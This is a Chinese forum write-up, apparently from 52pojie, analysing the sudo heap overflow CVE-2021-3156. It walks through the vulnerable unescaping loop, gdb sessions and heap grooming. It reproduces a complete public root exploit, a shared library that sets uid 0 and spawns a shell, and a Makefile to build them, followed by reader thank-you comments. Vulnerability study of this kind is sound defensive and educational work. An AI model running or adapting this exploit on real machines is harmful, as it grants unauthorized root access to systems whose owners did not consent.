> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1439734-1-1.html) ![](https://avatar.52pojie.cn/data/avatar/001/21/93/63_avatar_middle.jpg) 初来匝道记一次不完美的调试，由于没有弄清楚发布的 exp 中的环境变量到底如何影响堆分配，导致自己编译的 sudo 无法成功获取 root，但系统自带的没有问题，言归正传，具体内容如下：  

1 漏洞简介  
CVE-2021-3156 是 linux 系统中 sudo 命令的一个缓冲区溢出漏洞。  
漏洞等级：高危。  
漏洞风险：任何本地用户都可以利用该漏洞获取 root 权限，不需要知道用户密码，也无需身份认证。  
2 影响版本  
sudo 1.8.2-1.8.31p2  
sudo 1.9.0-1.9.5p1  
3 修复建议  
升级到高于 1.9.5 版本  
4 漏洞 POC  
4.1 验证环境  
Linux 版本：Linux kali 5.5.0-kali2-amd64  
Sudo 版本：1.8.31p1  
Glibc 版本：2.31  
源码：sudo-1.8.16p1.tar.gz  
调试器：gdb-peda  
4.2 静态分析  
本漏洞是由于在特定情况下，’\’的单个字符引起了堆溢出。  
1. 在 sudo 执行时，会对命令行输入参数进行解析得到 sudo_mode，解析函数 parse_args 位于 parse_args.c 中，对命令行参数进行拼接并用反斜杠转义所有特殊字符。  
![](https://attach.52pojie.cn/forum/202105/13/192354bt8xnjj22e66kx8m.png)

2. 外部输出参数最终需要保存到内存中的堆或栈空间，程序在 sudoers.c 中的 set_cmnd 函数将命令行参数复制到堆内存，并去掉所有转义符’\’。  
![](https://attach.52pojie.cn/forum/202105/13/192523u85gamokej705k0m.png)

3. 在 for 循环的拷贝中，user_args 的空间大小为命令行参数的大小，当输入的参数中有一个’\’时，from++ 会跳过该参数，将下一个参数复制到 to 中，造车给’\’后面的参数被重复拷贝，导致堆溢出。  
想要实现堆溢出，需要保证 parse_args 函数中转义字符部分代码不被执行，而 set_cmnd 执行。  
其中 / src/parse_argsc. 文件中 parse_args 转义代码的条件如 454 行，/plugins/sudoers.c 文件中 set_cmnd 反转义条件如 757 和 796 行。  
454: if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {  
757: if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {  
796: if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {

当我们使用 sudoedit 来执行 sudo 时，MODE_EDIT 被设置，在 111 行中我们可以看到支持 flags 为有效，sudoedit -s 使得 MODE_EIDT 和 MODE_SHELL 被设置有效，MODE_RUN 非有效。因此上述条件同时满足

![](https://attach.52pojie.cn/forum/202105/13/193714zlncgn8uwrlgrjuu.png)

4.3 动态调试  
使用工具 GDB。

```
sudo gdb --args sudoedit -s '\'  `python3 -c "print('A'*8)"`

```

首先下断点：

```
b main
set follow-exec-mode new
set breakpoint pending on
b sudoers.c:793
b sudoers.c:796

```

运行程序 r，然后 c 到目标断点处再单步执行。  
![](https://attach.52pojie.cn/forum/202105/13/193837o5alj40mjmt4ab40.png)

可以看到 user_args 申请的 size 为 11 = 2+9  
 ![](https://attach.52pojie.cn/forum/202105/13/200852uj4ej3cpy5eyevhy.png)   
命令行参数如上图  
 ![](https://attach.52pojie.cn/forum/202105/13/193902ybg8rozr8iotwumb.png)   
执行复制流程，可以看到在 to 所指向的堆中，跳过’\’后，首先复制第一个字符串结尾 \ 00，from++ 后，然后意外复制了第二个 8 个 A(0x41) 之后又复制一个空格（0x20），最后又复制了 8 个 A，导致溢出。  
 ![](https://attach.52pojie.cn/forum/202105/13/193923i3zysq0qd0vvqzv4.png) 

5 漏洞 EXP  
5.1 验证环境  
使用实际可以攻击成功的版本进行分析。  
Linux 版本：Linux kali 5.5.0-kali2-amd64  
Sudo 版本：1.8.31p1  
Glibc 版本：2.31  
Sudo 源码：sudo-1.8.31p1.tar.gz  
调试器：pwngdb  
5.2 流程简介  
在 blasty 的 exp 中，通过溢出改写 service_user 结构体实现。

```
typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;

```

service_user 在 nss_load_library(nss_load_library *ni) 的调用中 ni->library->lib_handle = __libc_dlopen (shlib_name) 载入指向的动态链接库。通过控制载入的库实现 root 权限的获取。

```
nss_load_library (service_user *ni)
{
  if (ni->library == NULL)
    {
      /* This service has not yet been used.  Fetch the service
         library for it, creating a new one if need be.  If there
         is no service table from the file, this static variable
         holds the head of the service_library list made from the
         default configuration.  */
      static name_database default_table;
      ni->library = nss_new_service (service_table ?: &default_table,
                                     ni->name);
      if (ni->library == NULL)
        return -1;
    }

  if (ni->library->lib_handle == NULL)
    {
      /* Load the shared library.  */
      size_t shlen = (7 + strlen (ni->name) + 3
                      + strlen (__nss_shlib_revision) + 1);
      int saved_errno = errno;
      char shlib_name[shlen];

      /* Construct shared object name.  */
      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
                                              "libnss_"),
                                    ni->name),
                          ".so"),
                __nss_shlib_revision);

      ni->library->lib_handle = __libc_dlopen (shlib_name);
      if (ni->library->lib_handle == NULL)
        {
          /* Failed to load the library.  */
          ni->library->lib_handle = (void *) -1l;
          __set_errno (saved_errno);
        }

```

从上面的代码可以看出，如果要加载伪造的库，需要满足两个条件：  
1.ni->library == NULL  
2.ni->library->lib_handle == NULL  
解决：  
1.ni->library == NULL 时，ni->library = nss_new_service(service_table ?: &default_table,ni->name)，这里如果我们将 ni->library 溢出为 null，正好可以加载我们伪造的 ni->name 服务  
2.ni->library->lib_handle == NULL，这里将 ni->library 溢出为 Null 即可。  
想要实现上述两个目标，需要对 service_user 这个结构体进行精准溢出，正常情况下，系统会加载 files、systemd 两个服务，我们需要将第一个 files 精准溢出改写。  
service_user 结构体是通过 nss 服务调用进行初始化，通过读取 / etc/nsswitch.conf 文件对 service_user 完成初始化。  
在 4 漏洞 poc 中我们发现了存在堆溢出的地方 user_args，现在我们找到需要利用堆溢出改写的地方 service_user，因此，接下来的工作就是构造堆布局。  
堆布局需要解决的问题是将 user_args 的堆布局到靠近 service_user 之前，距离越近越好。  
在 nsswitch.c 中我们看到 service_user 结构体链表由 service_table 存储，在如 4 漏洞 poc 中，仅设置 argsv 参数进行调试，当 service_table 完成初始化之后可以看到，entry/next/service 在堆空间中依次排列，此时，无法在 service_user 前申请合适的堆空间进行溢出且不破坏 service_table 前面部分。  
![](https://attach.52pojie.cn/forum/202105/13/193946ws4e9s4muy6hlb4g.png)

 ![](https://attach.52pojie.cn/forum/202105/13/193957qupajpjzzuj8akp5.png) 

```
typedef struct service_user
{
  /* And the link to the next entry.  */
  struct service_user *next;
  /* Action according to result.  */
  lookup_actions actions[5];
  /* Link to the underlying library object.  */
  service_library *library;
  /* Collection of known functions.  */
  void *known;
  /* Name of the service (`files', `dns', `nis', ...).  */
  char name[0];
} service_user;

typedef struct name_database_entry
{
  /* And the link to the next entry.  */
  struct name_database_entry *next;
  /* List of service to be used.  */
  service_user *service;
  /* Name of the database.  */
  char name[0];
} name_database_entry;


```

![](https://attach.52pojie.cn/forum/202105/13/201111rsytsjtonsdewu8u.png)

 ![](https://attach.52pojie.cn/forum/202105/13/194035drt6896ts6t6t888.png) 

通过源码分析，在完成整个 service_table 的过程中是按照行进行例如 passwd 为 name_database_entry，files、systemd 为 service_user，按照顺序进行初始化并加入链表。  
我们最终想要达到的目的是溢出改写一个 service_user 结构体的 known(XXX) 并由 nss_load_library 函数拼接为 libnss_XXX.so.2 并调用。我们的溢出手段是通过 user_args，因此，在写 user_args 之前，需要正好有一个 free 态的 bin，使得 user_args 刚好能够申请到，然后将随后的 service_user 溢出改写，并且不影响前面的 name_database_entry，否则链表被破坏后，将会造成 segment fault。  
在 main 函数中，setlocale(LC_ALL, "")，会堆环境变量进行初始化，这里面会进行多次堆申请和释放操作；随后 get_user_info()，会将 service_table 进行初始化操作；在 policy_check() 中会将 argv 复制到 user_args 的堆中。  
因此主要机会在于 setlocale 的操作中，通过调试发现，可以通过设置 LC_CTYPE，LC_MESSAGES，LC_TIME、LC_ALL 等变量控制堆的分配，如果能够在 service_table 初始化之前，在堆的前面留下多个 0x20 大小的堆，并在较远处留下 0x40 大小的堆，就正好将 name_database_entry 以及 service_user 结构体分开较大距离，方便溢出，并在 user_args 分配前将靠近 service_user 前面的堆释放，留给 user_args 获取，这样就能完美构造堆溢出的条件。

```
/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512

typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    }
};

void usage(char *prog) {
    printf("  usage: %s <target>\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf("    %d) %s\n", i, targets[i].target_name);
    }
    printf("  ------------------------------------------------------------\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");

    if (argc != 2) {
        usage(argv[0]);
        return -1;
    }

    target_t *target = &targets[ atoi(argv[1]) ];

    printf("using target: '%s'\n", target->target_name);

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");  //16
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}

```

使用上述 exp 进行调试，在 get_user_info 之后查看 service_table 链表，可以看到

<table><thead><tr><th></th><th>Name_database_entry (0x20)</th><th>service_user(0x40)</th><th>service_user(0x40)</th></tr></thead><tbody><tr><td>passwd</td><td>0x55555558<strong>2430</strong></td><td>0x55555558<strong>2450</strong></td><td>0x55555558<strong>2490</strong></td></tr><tr><td>grpup</td><td>0x55555558<strong>24d0</strong></td><td>0x55555558<strong><em>7080</em></strong></td><td>0x55555558<strong><em>70c0</em></strong></td></tr></tbody></table>

![](https://attach.52pojie.cn/forum/202105/13/194112ahgael5vgv7rc7j7.png)

从上面可以看到，在 service_table 完成初始化之后第二行的 entry 和 service_user 之间距离很大，再检查当前空闲堆链表。

![](https://attach.52pojie.cn/forum/202105/13/194132xpd5pw22n1h5p1jf.png)

可以看到 tcache 中正好有一个 0x80 大小的空闲堆在 service_user 之前，后面要做的就是在给 user_args 分配空间时，恰好拿到它。  
 ![](https://attach.52pojie.cn/forum/202105/13/194155x00lq37qe8ee3x9e.png)   
在最后，我们可以看到，溢出完成之后，我们成功分配到了 0x555555587000 的 tcache bin，并且成功将 0x5555555870b0 处的 files 改写为了 X/P0P_SH3LLZ_，  
继续调试，就能拿到 root shell。  
 ![](https://attach.52pojie.cn/forum/202105/13/201334ejmfrbuuru905rf1.gif) 5.3 参数分析  
上面为 blasty 的 exp，实际执行参数如下：

```
smash_a = "A"*56 + '\\'    
smash_b = "B"*54 + '\\'
s_envp[0:63] = "\\"
s_envp[63] = "X/P0P_SH3LLZ_"
s_envp[64] = “LC_ALL=C.UTF-8@", 'C' <repeats 212 times>
s_envp[65] = NULL
/usr/bin/sudoedit -s smash_a '\\' smash_b NULL s_envp

```

smash_a 和 smash_b 是用来控制 user_args 的堆大小，堆申请时 chunck size 大小为用户请求大小 + 16-8 align to 16，在 / plugins/sudoers 下的 sudoers.c 文件的 set_cmnd 中，关于 user_args 代码如下

```
 for (size = 0, av = NewArgv + 1; *av; av++)
                size += strlen(*av) + 1;
            if (size == 0 || (user_args = malloc(size)) == NULL) {
                sudo_warnx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
                debug_return_int(-1);
            }
            if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
                /*
                 * When running a command via a shell, the sudo front-end
                 * escapes potential meta chars.  We unescape non-spaces
                 * for sudoers matching and logging purposes.
                 */
                for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
                    while (*from) {
                        if (from[0] == '\\' && !isspace((unsigned char)from[1]))
                            from++;
                        *to++ = *from++;
                    }
                    *to++ = ' ';
                }
                *--to = '\0';
            } else {
                for (to = user_args, av = NewArgv + 1; *av; av++) {
                    n = strlcpy(to, *av, size - (to - user_args));
                    if (n >= size - (to - user_args)) {
                        sudo_warnx(U_("internal error, %s overflow"), __func__);
                        debug_return_int(-1);
                    }
                    to += n;
                    *to++ = ' ';
                }
                *--to = '\0';
            }


```

GDB 调试到该处查看参数，如下：

```
pwndbg> p NewArgv[0]
$1 = 0x555555570a0e "sudoedit"
pwndbg> p NewArgv[1]
$2 = 0x7fffffffedfc 'A' <repeats 56 times>, "\\"
pwndbg> p NewArgv[2]
$3 = 0x7fffffffee36 "\\"
pwndbg> p NewArgv[3]
$4 = 0x7fffffffee38 'B' <repeats 54 times>, "\\"
pwndbg> p NewArgv[4]
$5 = 0x0

```

可以看到 size=len(smash_a) + len(“\”) + len(smash_b) = 58 + 2 + 56 = 116，与调试结果一致

申请 chunk size = size +16 - 8 align 16 = 128 = 0x80，因此恰好能申请到 service_user 前的 0x80 大小的 tcache。  
向 user_args 中复制参数时，由于上述代码对”\” 处理的漏洞，导致以”\” 结尾的数据并没有停止复制，而是复制进去一个 00 后继续复制后面的字符串，因此当 smash_a 复制完之后，当前复制并没有结束，而是继续将”\” 复制了 00 到堆内存中，接着继续复制 smash_b，由于 envp 在栈中紧随 argv 之后，因此继续复制 envp，直到复制到以 \ 0 结尾的 envp[63] = "/P0P_SH3LLZ_" 才停止本次复制。然后开始下次循环复制。最终，smash_a 复制 1 次，”\” 复制 2 次，smash_b 和 envp[0:64] 复制 3 次。  
6 参考资料  
1.[https://www.kalmarunionen.dk/writeups/sudo/](https://www.kalmarunionen.dk/writeups/sudo/)  
2.[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)  
7 附录  
7.1 堆简介  
glibc 堆内存管理将空闲的堆块用多个链表进行存储管理，有如下几种：  
1.tcache：0x20 < size < 0x408，优先级最高，glibc 版本≥2.27 的新特性  
2.fastbin：0x20 < size < 0x80，优先级次之  
3.small bin  
4.large bin  
5.unsorted bin  
系统回收的堆按大小优先加入 tcache 或 fast bin，分配时按大小优先分配 tcache 或 fast bin。  
7.2X/P0P_SH3LLZ_

```
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void __attribute__ ((constructor)) _init(void);

static void _init(void) {
        printf("[+] bl1ng bl1ng! We got it!\n");
        setuid(0); seteuid(0); setgid(0); setegid(0);
        static char *a_argv[] = { "sh", NULL };
        static char *a_envp[] = { "PATH=/bin:/usr/bin:/sbin", NULL };
        execv("/bin/sh", a_argv);
}

```

7.3Makefile

```
all:
        rm -rf libnss_X
        mkdir libnss_X
        gcc -o sudo-hax-me-a-sandwich hax.c
        gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
clean:
        rm -rf libnss_X sudo-hax-me-a-sandwich

```

7.4 调试注意  
对此类调试熟悉的同学都知道，调试堆和运行堆存在差异，因此在调试本漏洞时需要使用调试堆，可以借助如下脚本

```
import subprocess, signal
import os
cmd = ['./gdb_test']
p = subprocess.Popen(cmd)
p.send_signal(signal.SIGSTOP)
pid = os.popen("pidof gdb_test").read()
if pid:
   input(f'[+] GDB Attach {pid}')

```

运行 gdb 时可以使用如下命令：  
gdb --pid `pidof  gdb_test` -x cmd_init.txt  
cmd_init.txt 文件中可以保存一些固定执行的命令，如加载 directory、breakpoint 等，本次调试使用命令如下：

```
set follow-fork-mode child
set detach-on-fork on
set breakpoint pending on
catch exec
c
c
c
directory /usr/src/glibc/glibc-2.31/
directory /usr/src/glibc/glibc-2.31/nss/
directory /usr/src/glibc/glibc-2.31/elf/
directory /usr/src/glibc/glibc-2.31/locale/
directory /home/kali/Desktop/myPoc/sudo/sudo-1.8.31p1/sudo-1.8.31p1
b sudo.c:154
b sudo.c:191
b sudoers.c:847
b sudoers.c:852
b sudoers.c:854    
b nsswitch.c:147
b nsswitch.c:498
b nsswitch.c:369
b __libc_dlopen_mode

```

set follow-fork-mode child 可以使程序从 gdb_test 进程进入到子进程 sudoedit。        set detach-on-fork on 可以在进入子进程后父进程保持。  
set breakpoint pending on 可以将断点在代码动态加载后自动设置。  
7.5sudo 编译  
编译采用如下命令：  
进入到加压后的目录下，

```
mkdir build
../configure --enable-env-dbg
make -j
sudo make

``` ![](https://avatar.52pojie.cn/data/avatar/001/66/02/57_avatar_middle.jpg)一路无忧 果然机器语言好复杂 要好好学习![](https://avatar.52pojie.cn/data/avatar/001/61/77/90_avatar_middle.jpg)加奈绘 学习一下，感谢分享 ![](https://avatar.52pojie.cn/data/avatar/000/24/83/92_avatar_middle.jpg) Niay 学习一下，感谢分享![](https://avatar.52pojie.cn/data/avatar/001/56/93/54_avatar_middle.jpg)Eapoul 好东西 学到了 ![](https://avatar.52pojie.cn/data/avatar/000/95/82/82_avatar_middle.jpg) luny 分析的很细致，学习了